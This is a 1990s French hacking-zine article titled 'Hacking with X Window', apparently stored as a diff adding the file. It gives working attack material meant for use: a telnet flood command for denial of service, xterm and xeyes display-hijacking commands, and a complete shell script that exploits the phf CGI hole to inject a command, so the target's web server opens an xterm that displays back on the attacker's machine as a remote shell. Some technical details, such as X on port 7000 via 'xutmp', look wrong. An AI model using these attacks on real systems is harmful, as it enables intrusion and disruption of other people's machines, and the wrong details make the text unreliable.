@@ -1,0 +1,203 @@
+
+                              Hacking with X Window
+                              ---------------------
+                                    par Bypass
+
+
+1) INTRODUCTION
+^^^^^^^^^^^^^^^
+
+	X Window est l'interface graphique la plus populaire d'UNiX. On la
+retrouve dans les universites comme dans  les  centres  de  recherches  du
+Pentagone.  Un  peu  comme  Win95,  il  gere  vos  windows, programmes, et
+processes. Mais il existe une distinction majeure: X utilise  un  protocol
+(xutmp).  Ainsi,  X  Window  peut  etre considere comme un serveur, et ses
+logiciels comme des clients. Mais il faut bien se comprendre:  le  service
+fournit  n'est  pas un acces au disque de l'hote, mais plutot a son ecran.
+C'est pour cela que quand l'on parle de "serveur X  Window"  on  parle  de
+votre serveur d'affichage (eg. XF86_SVGA). C'est cette caracteristique que
+nous tenterons d'exploiter.
+
+
+2) NOTION DE XHOST
+^^^^^^^^^^^^^^^^^^
+
+	Qu'est-ce que xhost ? Si  vous  connaissez  le  NFS,  vous  pouvez
+comparer  xhost  a  une  export  list. Xhost est un programme simple qui a
+comme fonction de determiner qui a acces et qui ne l'a pas a un  server X.
+On l'utilise selon le parametres suivants:
+
+	- xhost
+	  Donne une liste des hostnames ayant acces au serveur X
+
+	- xhost +[hostname]
+	  Ajoute un hostname a la liste d'acces
+
+	- xhost -[hostname]
+	  Devinez !
+
+	- xhost +/-
+	  Active ou desactive la liste d'acces
+
+	Il est imperatif de toujours garder cette liste a jour, et surtout
+de s'assurer que votre liste n'est pas "+" (disable control access).
+	
+
+3) FLOOD XUTMP
+^^^^^^^^^^^^^^
+
+	Qui dit "protocol" dit  aussi  "port".  Malheureusement  pour  les
+utilisateurs  d'X,  ce port (7000) est ouvert par default des le demarrage
+du serveur. Ainsi, en ouvrant plusieurs sessions telnet sur le port  xutmp
+de  votre  cible  en  le  floodant  de donnees, vous pourrez effectuer une
+attaque "Denial of Service", en causant au serveur un lag  extreme.  Voici
+un exemple d'attaque:
+
+  	SQC:/# telnet localhost 19 | telnet www.target.com 7000
+
+
+4) X DISPLAY HIJACKING
+^^^^^^^^^^^^^^^^^^^^^^
+
+	Essayer  de prendre control sur un serveur X necessite d'abord que
+vous soyez sur la liste de hotes de votre cible. Si vous avez acces  a  un
+compte shell sur votre cible, executez-y la commande "xhost":
+
+  	Target:~/$ xhost
+  	access control disabled, clients can connect from any host
+  	INET: localhost
+  	LOCAL:
+  	Target:~/$
+
+On  voit ici que tout client, peut importe son hostname, peut se connecter
+sur le serveur X. En resumer,  C'EST  PARFAIT !  Maintenant,  vous  pouvez
+envoyer,  par exemple, un xterm executant un telnet sur le port 19 du host
+local... Voici un exemple:
+
+  	SQC:/# xterm -display www.target.com:0 -e telnet localhost 19
+
+Ou meme un "xeyes flood" !
+  
+  	SQC:/# xeyes -display www.target.com:0 (repetition)
+
+
+5) XTERM HIJACKING
+^^^^^^^^^^^^^^^^^^ 
+
+	Ok. J'crois qu'il est temps de passer aux choses serieuses: gagner
+le R00T sur le serveur cible. Hey oui ! X Window peut vous donner  ce  que
+vous  desirez.  Pour  mettre  sur  pied  notre attaque, on se base sur une
+equation chimique hyper-evoluee, decouverte par Boltzman en 1802 (il etait
+ne a ce moment la ?), qui a revolutionne le monde entier (sure...)
+
+  	Phf Cgi-bin + X Window = COKTAIL MOLOTOV !!!!!!
+
+	C'est koi le principe de tout ca hein ?  Simple !  Vous  avez  une
+machine  cible  qui  possede  un  X Window et Phf ? Plutot que de depenser
+votre temps a downloader un /etc/passwd shadowed, essayez  donc  de  faire
+une  requete  de XTerm dont le display sera VOTRE serveur ! Voici 
+d'ailleurs un petit shell script qui vous permettra d'hijacker des xterms
+sans vous caser la tete... 
+
+------------------->8------------------->8------------------->8----------------
+
+#!/bin/sh 
+# 
+# Created by K-L0G in 1997 
+# Copyright (c), Source Quench Communications, 1996-1997 
+# 
+# Xterm hijacker via phf ...  
+# 
+# La cible necessite (pour ceux qui comprennent pas encore):  
+# - un PHF accessible 
+# - un Xterm 
+# 
+# PS: vous devez executer ce script a partir de X Window
+#
+
+echo ""  
+echo "XTerm Hijacker, created by K-L0G in 1997"  
+echo "Copyright(c), Source Quench Communications, 1996-1997"  
+echo "NB: This script must be executed from X Window"  
+echo "" 
+
+if [ $# -ne 1 ]; then
+  echo Usage: $0 [target]
+  echo ""
+  exit 127
+fi
+
+echo -n "Scanning for local IP ..."
+localip=`ifconfig ppp0 | grep inet | sed 's/:/ /g' | awk {'print $3'}`
+targetip=$1
+echo "done"
+echo "Local IP set as $localip"
+xhost + > /tmp/hijack.tmp
+echo Sending PHF request to $targetip
+lynx `echo -n $targetip`/cgi-bin/phf?Qname=%A0/usr/X11/bin/xterm%20-display%20`echo $localip`:0 > /tmp/hijack.tmp
+xhost - > /tmp/hijack.tmp
+echo "You should receive a XTerm in few seconds ..."
+rm /tmp/hijack.tmp 
+echo ""
+exit
+
+------------------->8------------------->8------------------->8----------------
+
+	Une fois que vous avez le term a votre ecran, vous aurez  acces  a
+votre  cible selon votre UID et GID de HTTPD (oubliez pas qu'on est passer 
+par PHF !). Vous pouvez aussi essayer de detourner d'autres  logiciels  X, 
+mais ca ne vous donnera jamais rien de plus qu'on bon vieux xterm...
+
+
+6) REFERENCES
+^^^^^^^^^^^^^
+
+	Pour avoir plus d'information sur la securite sous X Window, voici
+quelques endroits ou vous informer...
+
+  	- man xhost
+  	- man xterm
+  	- http://ciac.llnl.gov/ciac/documents/ciac2316.html
+  	- http://ftp.cert.org <--- evidemment ;)
+  	- Votre UNiX guru le plus proche
+  	- Votre libraire d'informatique (demandez lui surtout pas comment
+    	  hijacker X Window la !)
+
+
+7) CONCLUSION
+^^^^^^^^^^^^^
+
+	Comme d'habitude, si vous avez des  questions,  commentaires,  ou
+offres  d'emplois ;)  mailez  moi  a  SQC@hotmail.com. N'oubliez pas,  en
+passant, qu'on a un URGENT BESOIN DE TEXTES !!! Merci, comme  d'habitude,
+aux  autres  membres  du  groupe, a PhE, F-Kaos (groupes Francais), a mon
+chien (meme si j'en ai pas), chaque brain de gazon dans mon jardin, Canel
+pis  Pruno qui font des films porno (vous vous rappellez ?), anyway, tout
+le monde (y compris vous, chers lecteurs).
+
+
+                                           Bypass
+
+[EOF]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
